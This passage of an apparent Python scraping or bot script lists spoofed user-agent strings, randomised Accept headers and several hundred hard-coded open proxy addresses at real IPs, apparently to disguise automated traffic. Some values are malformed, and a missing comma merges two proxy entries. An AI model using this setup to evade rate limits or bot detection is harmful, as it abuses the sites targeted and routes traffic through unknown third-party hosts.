    "Dalvik/2.1.0 (Linux; U; Android 10; 8091 Build/PPR1.180610.011)",
    "Mozilla/5.0 (Linux; Android 7.0; SM-T810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; N817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; itel L5503 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2011K2G Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi MIX 2S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
]





accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/avif,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/avif",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7,image/avif,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8,image/webp;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp;q=0.8,*/*;q=0.7,image/avif",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif;q=0.8,image/webp;q=0.7,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/webp;q=0.7,image/avif;q=0.6",
    "text/html,application/xhtml+xml,application/xml;q=0.8,image/avif,image/webp,*/*;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9,image/avif,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/webp,image/apng",

    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
    "text/html,application/xhtml+xml,application/xml;q=0.9", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.8;q=0.7;q=0.6,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*",

    "*/*",
    "text/html",
    "text/html,application/xhtml+xml",
    "text/html,application/xhtml+xml,*/*",
    "text/html,application/xhtml+xml,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,image/png",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,image/png,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/webp;q=0.7,image/avif;q=0.6,image/png;q=0.5"
]

accept_language_list = [
    "Accept-Language: en-US;q=0.9, es-ES;q=0.8, fr-FR;q=0.7",
    "Accept-Language: pt-BR;q=0.9, de-DE;q=0.6, zh-CN;q=0.5",
    "Accept-Language: ja-JP;q=0.9, en-GB;q=0.8, it-IT;q=0.7",
    "Accept-Language: es-MX;q=0.9, ru-RU;q=0.6, en-CA;q=0.5",
    "Accept-Language: fr-FR;q=0.9, ko-KR;q=0.8, es-ES;q=0.7",
    "Accept-Language: de-DE;q=0.9, en-US;q=0.8, zh-CN;q=0.7",
    "Accept-Language: it-IT;q=0.9, pt-BR;q=0.8, ja-JP;q=0.7",
    "Accept-Language: zh-CN;q=0.9, ru-RU;q=0.8, en-GB;q=0.7",
    "Accept-Language: ko-KR;q=0.9, es-MX;q=0.8, fr-FR;q=0.7",
    "Accept-Language: en-CA;q=0.9, de-DE;q=0.8, it-IT;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.8, de-DE;q=0.7",
    "Accept-Language: zh-TW;q=0.9, en-US;q=0.8, es-ES;q=0.7",
    "Accept-Language: ar-SA;q=0.9, en-GB;q=0.8, fr-CA;q=0.7",
    "Accept-Language: pl-PL;q=0.9, en-US;q=0.8, ru-RU;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.7, de-DE;q=0.6",
    "Accept-Language: hi-IN;q=0.9, en-US;q=0.8, fr-FR;q=0.7",
    "Accept-Language: tr-TR;q=0.9, en-GB;q=0.8, de-DE;q=0.7",
    "Accept-Language: en-US;q=0.9, it-IT;q=0.8, es-ES;q=0.7",
    "Accept-Language: en-GB;q=0.9, es-MX;q=0.8, fr-FR;q=0.7",
    "Accept-Language: en-US;q=0.9, pl-PL;q=0.7, de-DE;q=0.6",
    "Accept-Language: en-GB;q=0.9, pt-PT;q=0.7, es-ES;q=0.6",
    "Accept-Language: it-IT;q=0.9, de-DE;q=0.8, en-US;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.8, es-MX;q=0.7",
    "Accept-Language: en-CA;q=0.9, es-ES;q=0.8, fr-FR;q=0.7",
    "Accept-Language: en-US;q=0.9, ko-KR;q=0.8, es-ES;q=0.7",
    "Accept-Language: zh-CN;q=0.9, en-US;q=0.8, de-DE;q=0.7",
    "Accept-Language: en-US;q=0.9, ru-RU;q=0.8, de-DE;q=0.7",
    "Accept-Language: fr-FR;q=0.9, de-DE;q=0.8, en-US;q=0.7",
    "Accept-Language: en-US;q=0.9, fr-CA;q=0.8, es-MX;q=0.7",
    "Accept-Language: es-ES;q=0.9, pt-BR;q=0.8, en-US;q=0.7",
    "Accept-Language: en-GB;q=0.9, pl-PL;q=0.8, es-MX;q=0.7",
    "Accept-Language: it-IT;q=0.9, en-GB;q=0.8, de-DE;q=0.7",
    "Accept-Language: de-DE;q=0.9, en-US;q=0.8, es-ES;q=0.7",
    "Accept-Language: en-US;q=0.9, zh-TW;q=0.8, es-ES;q=0.7",
    "Accept-Language: fr-CA;q=0.9, en-US;q=0.8, de-DE;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.8, it-IT;q=0.7",
    "Accept-Language: ru-RU;q=0.9, en-US;q=0.8, fr-FR;q=0.7",
    "Accept-Language: es-MX;q=0.9, en-US;q=0.8, zh-CN;q=0.7",
    "Accept-Language: en-US;q=0.9, zh-CN;q=0.8, es-ES;q=0.7",
    "Accept-Language: fr-FR;q=0.9, en-GB;q=0.8, zh-CN;q=0.7",
    "Accept-Language: zh-CN;q=0.9, ko-KR;q=0.8, en-GB;q=0.7",
    "Accept-Language: pt-BR;q=0.9, en-US;q=0.8, fr-FR;q=0.7"
]






headers1 = {
    'User-Agent': random.choice(user_agent_list),
    'Accept': random.choice(accept_headers),
    'Accept-Language': random.choice(accept_language_list),
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


#--------------------------------

proxy_list = [

    'http://80.87.178.175:8080', 'http://103.149.177.204:3128', 'http://217.88.78.140:8080', 
    'http://27.79.166.96:16000', 'http://5.78.98.148:3128', 'http://122.222.186.86:8080', 
    'http://178.48.68.61:18080', 'http://27.79.160.196:16000', 'http://209.14.98.6:8080', 
    'http://80.240.55.242:3128', 'http://192.9.237.224:3128', 'http://152.26.231.77:9443', 
    'http://116.203.7.46:8080', 'http://27.79.221.226:16000', 'http://15.204.240.177:3128', 
    'http://202.57.25.91:1111', 'http://186.167.80.234:8090', 'http://45.184.103.105:999', 
    'http://51.89.96.237:3128', 'http://194.233.66.80:3128', 'http://92.126.3.65:3128', 
    'http://70.42.55.70:3128', 'http://104.153.107.5:3128', 'http://184.58.72.56:8080', 
    'http://5.39.66.126:3128', 'http://37.47.103.26:3128', 'http://103.161.86.196:80', 
    'http://182.60.29.228:3128', 'http://195.150.160.135:3128', 'http://116.203.7.46:8080',
    "http://91.241.217.58:9090", "http://31.214.173.222:8888", "http://45.234.83.248:8080", "http://8.215.3.250:8008",
    "http://52.67.10.183:3128", "http://8.213.197.208:8081", "http://198.49.68.80:80", "http://103.152.112.157:80",
    "http://203.150.128.82:8080", "http://202.154.18.1:4995", "http://47.237.2.245:1311", "http://79.110.201.235:8081",
    "http://47.237.67.157:3128", "http://8.221.139.222:8108", "http://171.15.37.211:20004", "http://8.221.139.222:80",
    "http://18.228.198.164:3128", "http://45.249.122.198:8080", "http://194.233.66.80:3128", "http://209.97.150.167:3128",
    "http://47.90.167.27:9080", "http://47.89.159.212:137", "http://3.123.150.192:3128", "http://43.133.136.208:8800",
    "http://204.236.137.68:80", "http://47.250.177.202:80", "http://63.35.64.177:3128", "http://47.108.159.113:8008",
    "http://47.250.159.65:8008", "http://20.205.61.143:8123", "http://185.105.102.189:80", "http://8.220.136.174:9098",
    "http://20.111.54.16:8123", "http://8.213.195.191:90", "http://20.210.113.32:8123", "http://156.231.136.254:8888",
    "http://8.211.194.85:5060", "http://47.76.144.139:9080", "http://3.122.84.99:3128", "http://8.213.128.6:5000",
    "http://114.220.34.206:7788", "http://3.141.217.225:80", "http://159.203.61.169:8080", "http://47.250.177.202:9080",
    "http://181.74.80.52:999", "http://80.249.112.162:80", "http://8.220.204.92:80", "http://52.73.224.54:3128",
    "http://27.79.160.196:16000", "http://47.89.159.212:3128", "http://43.200.77.128:3128", "http://180.178.37.114:80",
    "http://130.162.180.254:8888", "http://8.138.133.207:8081", "http://39.109.113.97:4090", "http://27.79.251.131:16000",
    "http://159.253.4.219:80", "http://8.211.195.173:28737", "http://51.91.109.83:80", "http://158.255.77.169:80",
    "http://3.123.150.192:80", "http://8.218.82.248:80", "http://47.250.51.110:8080", "http://54.233.119.172:3128",
    "http://47.91.120.190:9080", "http://103.47.175.161:83", "http://27.79.171.47:16000", "http://8.220.205.172:8080",
    "http://8.221.138.111:8081", "http://27.79.248.151:16000", "http://47.92.143.92:9080", "http://47.251.122.81:8888",
    "http://47.238.60.156:80", "http://8.211.195.173:8072", "http://8.219.229.53:8443", "http://47.237.2.245:80",
    "http://39.172.97.192:8060", "http://104.130.135.21:8088", "http://47.91.115.179:80", "http://39.104.23.154:9080",
    "http://103.172.42.233:1111", "http://27.79.222.152:16000", "http://13.56.192.187:80", "http://114.35.140.157:8080",
    "http://141.145.197.152:8888", "http://20.206.106.192:8123", "http://39.102.213.50:3128", "http://8.213.128.90:8192",
    "http://37.46.241.247:80", "http://27.79.133.222:16000", "http://8.221.138.111:1080", "http://159.65.221.25:80",
    "http://5.161.103.41:88", "http://8.212.165.164:5060", "http://183.240.196.55:38080", "http://54.248.238.110:80",
    "http://3.127.62.252:80", "http://103.242.104.209:8080", "http://61.129.2.212:8080", "http://27.79.246.98:16000",
    "http://27.79.161.86:16000", "http://8.138.133.207:9080", "http://39.102.213.3:3128", "http://117.74.65.207:443",
    "http://185.105.102.179:80", "http://181.205.243.147:999", "http://47.91.29.151:8443", "http://8.220.204.92:9091",
    "http://106.42.30.243:82", "http://171.15.37.211:20014", "http://200.164.28.168:8111", "http://18.228.198.164:80",
    "http://162.223.90.130:80", "http://47.104.198.111:9999", "http://43.202.154.212:80", "http://148.66.6.213:80",
    "http://5.58.25.124:8080", "http://148.66.6.210:80", "http://3.212.148.199:3128", "http://103.149.177.204:3128",
    "http://68.183.98.179:80", "http://79.110.200.148:8081", "http://39.102.210.222:9999", "http://106.14.241.115:80",
    "http://46.51.249.135:3128", "http://18.228.149.161:80", "http://148.206.32.3:8080", "http://18.185.169.150:3128",
    "http://67.43.227.226:4081", "http://35.72.118.126:80", "http://113.160.132.195:8080", "http://8.221.141.88:3128",
    "http://67.43.236.19:5955", "http://133.18.234.13:80", "http://27.79.181.9:16000", "http://149.129.255.179:80",
    "http://35.76.62.196:80", "http://47.250.155.254:8081", "http://3.136.29.104:80", "http://43.243.117.57:80",
    "http://213.148.10.199:3128", "http://107.172.96.11:24283", "http://13.59.156.167:3128", "http://190.122.88.144:8080",
    "http://8.213.128.90:8081", "http://200.110.173.17:999", "http://185.159.153.234:80", "http://13.37.73.214:3128",
    "http://47.122.65.32:3128", "http://78.80.228.150:80", "http://171.15.37.211:20015", "http://47.91.115.179:8080",
    "http://103.106.231.188:42361", "http://8.213.197.208:3128", "http://13.36.113.81:3128", "http://47.251.73.54:8081",
    "http://149.129.255.179:8080", "http://148.66.6.211:80", "http://221.231.13.198:1080", "http://36.134.91.82:8888",
    "http://47.238.134.126:81", "http://153.101.67.170:9002", "http://13.208.56.180:80", "http://3.78.92.159:80",
    "http://8.211.49.86:5007", "http://39.100.88.89:3128", "http://47.252.18.37:80", "http://165.232.129.150:80",
    "http://47.92.194.235:3128", "http://62.33.53.248:3128", "http://47.238.134.126:100", "http://47.237.113.119:80",
    "http://39.101.65.228:3132", "http://47.238.134.126:8080", "http://27.79.197.88:16000",
    "http://172.245.17.46:80", "http://154.236.177.110:1976", "http://45.177.178.20:999", 
    "http://49.0.251.151:3128", "http://179.127.241.200:999", "http://38.153.3.220:999", 
    "http://190.2.214.130:999", "http://38.153.3.221:999", "http://45.229.181.158:999", 
    "http://154.236.179.226:1981", "http://103.180.173.178:8899", "http://185.61.152.137:8080", 
    "http://154.236.191.95:1976", "http://154.236.191.122:1981", "http://45.5.92.94:8137", 
    "http://154.236.177.178:1981", "http://154.236.179.38:1981", "http://154.236.179.202:1981", 
    "http://109.200.156.102:8080", "http://38.153.3.163:999", "http://154.236.191.61:1981", 
    "http://154.236.179.233:1981", "http://186.67.156.146:999", "http://154.236.191.93:1981", 
    "http://154.236.179.66:1981", "http://45.5.118.173:999", "http://154.236.179.76:1981", 
    "http://154.236.179.154:1981", "http://154.236.191.160:1981", "http://154.236.191.66:1981", 
    "http://45.70.238.45:999", "http://154.236.191.71:1981", "http://45.170.101.202:999", 
    "http://38.153.3.70:999", "http://179.1.72.107:999", "http://181.6.60.130:999", 
    "http://38.153.3.190:999", "http://154.236.191.208:1981", "http://154.236.179.241:1981", 
    "http://190.14.38.152:999", "http://154.236.179.8:1981", "http://154.236.191.173:1981", 
    "http://38.153.3.158:999", "http://38.153.3.239:999", "http://154.236.191.108:1981", 
    "http://154.236.191.209:1981", "http://154.236.191.187:1981", "http://154.236.191.115:1981", 
    "http://154.236.191.135:1981", "http://154.236.179.210:1981", "http://154.236.179.67:1981", 
    "http://154.236.179.90:1981", "http://154.236.191.227:1981", "http://45.6.226.94:999", 
    "http://154.236.191.76:1981", "http://154.236.179.21:1981", "http://154.236.179.23:1981", 
    "http://154.236.191.117:1981", "http://45.5.117.173:999", "http://154.236.191.144:1981", 
    "http://154.236.191.142:1981", "http://154.236.191.222:1981", "http://38.153.3.179:999", 
    "http://154.236.191.128:1981", "http://154.236.191.202:1981", "http://154.236.191.182:1981", 
    "http://154.236.191.113:1981", "http://154.236.191.157:1981", "http://154.236.191.132:1981", 
    "http://154.236.191.136:1981", "http://154.236.191.200:1981", "http://154.236.191.125:1981", 
    "http://154.236.191.94:1981", "http://154.236.191.123:1981", "http://154.236.191.174:1981", 
    "http://154.236.191.183:1981", "http://154.236.191.213:1981", "http://154.236.191.140:1981", 
    "http://154.236.191.99:1981", "http://154.236.191.153:1981", "http://154.236.191.207:1981", 
    "http://154.236.191.92:1981", "http://154.236.191.146:1981", "http://154.236.191.126:1981", 
    "http://154.236.191.201:1981", "http://154.236.191.131:1981", "http://154.236.191.185:1981", 
    "http://154.236.191.122:1981", "http://154.236.191.91:1981", "http://154.236.191.169:1981", 
    "http://154.236.191.120:1981", "http://154.236.191.195:1981", "http://154.236.191.220:1981", 
    "http://154.236.191.145:1981", "http://154.236.191.166:1981", "http://154.236.191.167:1981",
    "http://13.37.73.214:80",
    "http://154.16.146.46:80",
    "http://80.15.216.57:80",
    "http://8.211.194.78:80",
    "http://44.219.175.186:80",
    "http://23.82.137.162:80",
    "http://143.42.66.91:80",
    "http://192.73.244.36:80",
    "http://138.68.235.51:80",
    "http://13.38.153.36:80",
    "http://3.127.121.101:80",
    "http://47.91.89.3:80",
    "http://23.247.137.142:80",
    "http://3.71.239.218:80",
    "http://3.126.147.182:80",
    "http://13.36.104.85:80",
    "http://8.211.42.167:80",
    "http://47.238.128.246:80",
    "http://154.65.39.7:80",
    "http://45.8.21.156:80",
    "http://184.169.154.119:80",
    "http://34.122.187.196:80",
    "http://44.195.247.145:80",
    "http://3.124.133.93:80",
    "http://44.218.183.55:80",
    "http://3.129.184.210:80",
    "http://13.37.89.201:80",
    "http://51.89.255.67:80",
    "http://3.139.242.184:80",
    "http://154.16.146.47:80",
    "http://103.152.112.120:80",
    "http://13.37.59.99:80",
    "http://38.54.116.9:80",
    "http://3.90.100.12:80",
    "http://3.122.84.99:80",
    "http://54.152.3.36:80",
    "http://198.49.68.80:80",
    "http://103.152.112.157:80",
    "http://204.236.137.68:80",
    "http://3.141.217.225:80",
    "http://159.253.4.219:80",
    "http://51.91.109.83:80",
    "http://3.123.150.192:80",
    "http://47.238.60.156:80",
    "http://47.237.2.245:80",
    "http://13.56.192.187:80",
    "http://159.65.221.25:80",
    "http://3.127.62.252:80",
    "http://162.223.90.130:80",
    "http://68.183.98.179:80",
    "http://3.136.29.104:80",
    "http://43.243.117.57:80",
    "http://3.78.92.159:80",
    "http://47.252.18.37:80",
    "http://165.232.129.150:80",
    "http://47.237.113.119:80"
    "http://176.32.35.11:8888",
    "http://34.122.187.196:80",
    "http://23.247.137.142:80",
    "http://113.108.13.120:8083",
    "http://212.193.4.133:1080",
    "http://183.215.23.242:9091",
    "http://162.43.41.211:3129",
    "http://8.211.42.167:25565",
    "http://210.73.75.166:80",
    "http://103.126.28.69:8989",
    "http://103.157.146.168:6969",
    "http://45.136.70.251:3128",
    "http://141.145.197.152:8888",
    "http://110.74.195.142:8080",
    "http://4.155.2.13:80",
    "http://165.16.27.43:1981",
    "http://125.25.149.204:8080",
    "http://27.79.150.64:16000",
    "http://103.191.196.155:8080",
    "http://116.231.167.55:8118",
    "http://93.127.215.97:80",
    "http://27.79.170.1:16000",
    "http://135.181.154.225:80",
    "http://194.182.163.117:3128",
    "http://183.196.80.217:8060",
    "http://47.90.205.231:33333",
    "http://147.78.169.80:800",
    "http://34.80.240.128:8080",
    "http://45.163.66.247:8088",
    "http://38.54.71.67:80",
    "http://165.255.22.244:8080",
    "http://143.42.191.48:80",
    "http://60.53.133.218:8080",
    "http://101.255.167.50:8080",
    "http://67.43.228.250:10125",
    "http://27.79.252.95:16000",
    "http://47.91.29.151:8081",
    "http://114.35.140.157:8080",
    "http://97.74.87.226:80",
    "http://189.90.255.208:3128",
    "http://8.213.151.128:3128",
    "http://103.164.223.54:8080",
    "http://118.97.164.19:8080",
    "http://209.14.98.5:8080",
    "http://181.236.247.8:8809",
    "http://34.81.72.31:80",
    "http://138.68.60.8:8080",
    "http://196.1.92.12:80",
    "http://67.43.227.230:31423",
    "http://180.191.16.9:8085",
    "http://36.50.115.180:8081",
    "http://144.126.216.57:80",
    "http://37.26.86.206:47464",
    "http://36.92.193.189:80",
    "http://193.181.35.143:8118",
    "http://171.15.37.211:20003",
    "http://157.254.53.50:80",
    "http://77.37.8.47:3002",
    "http://36.95.82.69:8080",
    "http://43.229.254.221:8181",
    "http://60.188.102.225:18080",
    "http://4.155.2.13:9480",
    "http://154.205.83.139:10017",
    "http://103.153.246.61:8080",
    "http://4.155.2.13:9400",
    "http://190.6.162.3:8080",
    "http://103.41.33.169:58080",
    "http://31.161.38.233:8090",
    "http://192.9.237.224:3128",
    "http://41.59.82.154:3128",
    "http://186.215.87.194:8901",
    "http://190.104.20.85:8080",
    "http://38.45.45.60:999",
    "http://101.255.209.210:8080",
    "http://36.103.179.194:8088",
    "http://103.156.249.86:8080",
    "http://154.64.219.4:8888",
    "http://51.79.71.106:8080",
    "http://62.84.245.79:80",
    "http://27.79.169.134:16000",
    "http://103.148.44.101:8080",
    "http://103.48.68.68:83",
    "http://202.61.120.182:8080",
    "http://193.122.197.154:80",
    "http://196.251.195.146:8082",
    "http://36.91.148.36:8080",
    "http://162.223.90.130:80",
    "http://67.43.228.253:9117",
    "http://38.183.146.183:8080",
    "http://67.43.228.253:11505",
    "http://27.79.135.9:16000",
    "http://185.208.101.89:8080",
    "http://157.10.182.233:8080",
    "http://103.152.112.120:80",
    "http://65.155.249.100:8080",
    "http://103.91.206.107:8805",
    "http://182.78.42.112:83",
    "http://181.78.105.156:999",
    "http://84.53.245.42:41258",
    "http://45.122.228.10:8899",
    "http://181.236.247.8:8806",
    "http://197.248.231.91:8080",
    "http://61.178.141.146:80",
    "http://172.105.130.80:8888",
    "http://46.99.178.155:1339",
    "http://200.201.134.188:8787",
    "http://119.40.98.29:80",
    "http://121.8.215.106:9797",
    "http://20.222.243.172:9443",
    "http://103.213.218.9:22375",
    "http://38.52.212.20:999",
    "http://45.91.8.193:3128",
    "http://104.130.135.21:8088",
    "http://179.1.13.67:8080",
    "http://27.79.251.131:16000",
    "http://183.240.46.42:443",
    "http://47.238.134.126:808",
    "http://103.122.1.65:8181",
    "http://103.235.34.30:57413",
    "http://103.247.22.124:4317",
    "http://8.211.42.167:3128",
    "http://38.242.245.172:3128",
    "http://4.175.200.138:8080",
    "http://119.11.205.202:8082",
    "http://190.94.213.58:999",
    "http://45.84.138.40:7606",
    "http://159.223.74.131:4750",
    "http://103.172.42.121:8080",
    "http://171.15.37.211:20011",
    "http://8.209.255.13:3128",
    "http://38.52.222.245:999",
    "http://89.116.34.113:80",
    "http://122.10.225.55:8000",
    "http://185.125.169.24:8118",
    "http://47.238.134.126:8081",
    "http://160.22.6.140:8080",
    "http://186.115.202.103:8080",
    "http://45.167.126.237:999",
    "http://103.149.238.99:8080",
    "http://114.142.72.84:8080",
    "http://103.174.96.178:8080",
    "http://151.253.43.108:8080",
    "http://182.43.75.144:8000",
    "http://175.42.202.118:3128",
    "http://151.253.43.108:9090",
    "http://107.170.99.99:3128",
    "http://159.89.186.140:8080",
    "http://103.206.200.218:8080",
    "http://36.40.106.194:8080",
    "http://103.245.184.110:8080",
    "http://103.174.220.15:8080",
    "http://35.179.180.200:3128",
    "http://170.78.24.96:8080",
    "http://194.27.24.96:8080",
    "http://103.35.188.19:8080",
    "http://103.37.235.233:8000",
    "http://103.245.44.65:9999",
    "http://103.121.121.212:80",
    "http://105.112.198.95:8080",
    "http://185.81.104.9:9999",
    "http://117.169.144.118:8080",
    "http://39.49.65.98:8080",
    "http://145.239.107.122:8080",
    "http://179.43.43.6:3128",
    "http://163.172.182.179:8080",
    "http://198.57.65.121:8080",
    "http://39.48.245.79:8080",
    "http://163.172.182.179:80",
    "http://213.41.42.68:8080",
    "http://103.31.79.39:8080",
    "http://190.128.96.37:8080",
    "http://181.212.202.122:8080",
    "http://181.112.210.49:8080",
    "http://217.10.245.22:80",
    "http://36.40.103.82:8080",
    "http://177.37.241.72:8080",
    "http://144.139.160.67:8080",
    "http://181.211.147.105:8080",
    "http://171.98.46.43:80",
    "http://175.38.238.89:3128",
    "http://103.228.28.110:3128",
    "http://180.73.28.195:80",
    "http://185.12.177.156:8080",
    "http://178.154.161.122:3128",
    "http://61.28.21.76:8080",
    "http://103.78.151.132:3128",
    "http://39.56.124.71:3128",
    "http://81.170.64.230:3128",
    "http://190.204.65.26:3128",
    "http://103.255.211.204:8080",
    "http://191.235.163.196:8080",
    "http://102.128.94.80:8080",
    "http://42.100.75.53:3128",
    "http://58.48.37.121:8080",
    "http://111.96.139.98:8080",
    "http://94.22.209.42:8080",
    "http://191.211.194.248:3128",
    "http://103.22.102.85:8080",
    "http://93.100.63.54:3128",
    "http://103.227.159.101:80",
    "http://175.21.235.41:3128",
    "http://81.22.221.83:8080",
    "http://103.34.100.88:8080",
    "http://181.30.157.220:8080",
    "http://181.118.210.212:8080",
    "http://176.122.233.52:8080",
    "http://103.33.160.69:8080",
    "http://217.118.75.38:8080",
    "http://183.58.139.160:3128",
    "http://209.250.232.243:8080",
    "http://185.45.211.233:8080",
    "http://176.98.91.48:8080",
    "http://181.211.163.121:8080",
    "http://189.41.45.51:8080",
    "http://185.12.42.55:3128",
    "http://103.27.238.59:3128",
    "http://43.250.7.243:3128",
    "http://189.24.97.71:3128",
    "http://41.91.139.9:8080",
    "http://222.112.25.114:8080",
    "http://41.91.8.62:3128",
    "http://174.63.240.78:8080",
    "http://180.75.118.46:8080",
    "http://110.74.10.139:3128",
    "http://190.217.158.143:8080",
    "http://61.90.103.246:3128",
    "http://185.94.48.161:3128",
    "http://103.232.25.19:3128",
    "http://189.42.230.149:3128",
    "http://103.131.172.228:8080",
    "http://103.239.74.66:8080",
    "http://107.160.144.249:8080",
    "http://190.94.213.58:3128",
    "http://103.112.15.71:8080",
    "http://113.60.4.84:8080",
    "http://103.157.139.1:8080",
    "http://103.198.98.30:8080",
    "http://179.33.226.6:3128",
    "http://181.112.199.47:8080",
    "http://182.53.160.82:8080",
    "http://103.244.91.69:8080",
    "http://103.231.58.210:3128",
    "http://190.204.63.25:8080",
    "http://41.241.23.39:3128",
    "http://51.79.100.42:8080",
    "http://61.13.8.226:8080",
    "http://194.87.195.243:3128",
    "http://54.37.72.89:80",
    "http://8.215.41.90:8080",
    "http://103.112.163.94:3125",
    "http://103.126.87.181:7777",
    "http://69.75.140.157:8080",
    "http://75.128.125.149:8080",
    "http://103.247.14.115:9285",
    "http://67.43.227.226:12597",
    "http://37.98.219.183:8123",
    "http://35.247.237.139:31987",
    "http://223.204.193.81:8080",
    "http://103.13.204.89:8083",
    "http://36.94.2.138:8080",
    "http://182.93.75.77:8080",
    "http://77.221.151.186:3128",
    "http://149.86.140.131:8080",
    "http://91.121.88.53:80",
    "http://103.106.231.188:42357",
    "http://72.10.160.172:17173",
    "http://103.106.231.188:47313",
    "http://103.153.191.9:8085",
    "http://141.147.9.254:80",
    "http://8.219.97.248:80",
    "http://181.176.160.28:999",
    "http://103.48.71.126:83",
    "http://165.16.27.105:1976",
    "http://8.218.117.116:1057",
    "http://114.228.72.156:1080",
    "http://41.60.239.89:8080",
    "http://103.26.109.62:84",
    "http://204.10.194.63:10078",
    "http://103.106.231.188:47238",
    "http://36.91.155.42:8080",
    "http://36.67.8.169:8080",
    "http://209.14.118.114:999",
    "http://190.61.90.117:8080",
    "http://191.102.123.196:999",
    "http://38.137.203.14:999",
    "http://103.106.231.188:42011",
    "http://103.148.130.39:8080",
    "http://171.240.89.128:10007",
    "http://103.106.231.188:47265",
    "http://129.213.104.238:80",
    "http://182.253.40.49:8080",
    "http://46.99.162.194:8082",
    "http://119.47.90.240:1111",
    "http://101.237.38.98:13128",
    "http://79.106.108.150:8079",
    "http://103.126.172.139:8080",
    "http://36.134.91.82:8888",
    "http://8.219.229.53:8888",
    "http://103.48.68.75:83",
    "http://103.175.46.163:8080",
    "http://8.219.229.53:8200",
    "http://119.252.173.26:8080",
    "http://190.8.164.64:999",
    "http://41.65.46.178:1981",
    "http://153.101.67.170:9002",
    "http://34.23.45.223:80",
    "http://103.106.231.188:42341",
    "http://186.97.192.60:999",
    "http://143.42.66.91:80",
    "http://110.137.26.233:8080",
    "http://103.139.98.157:8080",
    "http://103.106.231.188:41903",
    "http://103.234.35.142:8090",
    "http://27.79.220.223:16000",
    "http://59.36.239.108:21133",
    "http://103.155.168.93:8299",
    "http://188.132.222.247:8080",
    "http://188.132.222.39:8080",
    "http://103.73.66.36:8085",
    "http://35.197.150.32:8888",
    "http://194.233.66.80:3128",
    "http://157.66.36.59:3125",
    "http://120.71.144.31:8093",
    "http://103.23.196.21:8080",
    "http://103.151.177.106:80",
    "http://92.124.132.106:3128",
    "http://38.188.127.228:8080",
    "http://27.189.128.199:8089",
    "http://129.159.88.228:80",
    "http://137.116.142.82:80",
    "http://103.220.23.177:8080",
    "http://103.25.81.116:8080",
    "http://107.172.96.11:24283",
    "http://195.26.255.4:3128",
    "http://103.23.141.253:8181",
    "http://85.214.195.118:80",
    "http://113.192.48.26:8181",
    "http://103.166.32.78:8091",
    "http://47.247.218.29:3129",
    "http://149.28.181.248:80",
    "http://138.201.139.121:3128",
    "http://47.237.67.157:3128",
    "http://198.49.68.80:80",
    "http://111.1.61.49:3128",
    "http://116.107.125.84:10089",
    "http://45.114.144.97:32650",
    "http://211.38.54.81:3023",
    "http://103.254.106.74:8080",
    "http://27.147.155.44:58080",
    "http://103.231.236.82:8080",
    "http://50.62.183.223:80",
    "http://103.48.71.70:83",
    "http://103.152.112.157:80",
    "http://188.132.222.3:8080",
    "http://67.43.227.227:24369",
    "http://67.43.228.251:33175",
    "http://27.79.242.94:16000",
    "http://103.181.255.219:7777",
    "http://27.79.193.99:16000",
    "http://27.79.171.47:16000",
    "http://103.26.110.46:84",
    "http://103.26.108.254:84",
    "http://103.41.32.185:58080",
    "http://27.79.164.19:16000",
    "http://27.79.138.51:16000",
    "http://27.79.194.43:16000",
    "http://27.79.145.188:16000",
    "http://27.79.235.193:16000",
    "http://27.79.189.11:16000",
    "http://45.151.70.164:8080",
    "http://27.79.185.186:16000",
    "http://27.79.198.61:16000",
    "http://27.79.161.173:16000",
    "http://27.79.196.228:16000",
    "http://27.79.186.98:16000",
    "http://27.79.194.190:16000",
    "http://27.79.241.198:16000",
    "http://27.79.136.134:16000",
    "http://27.79.240.197:16000",
    "http://27.79.212.132:16000",
    "http://27.79.232.218:16000",
    "http://27.79.186.193:16000",
    "http://138.0.231.202:999",
    "http://27.79.134.75:16000",
    "http://27.79.177.171:16000",
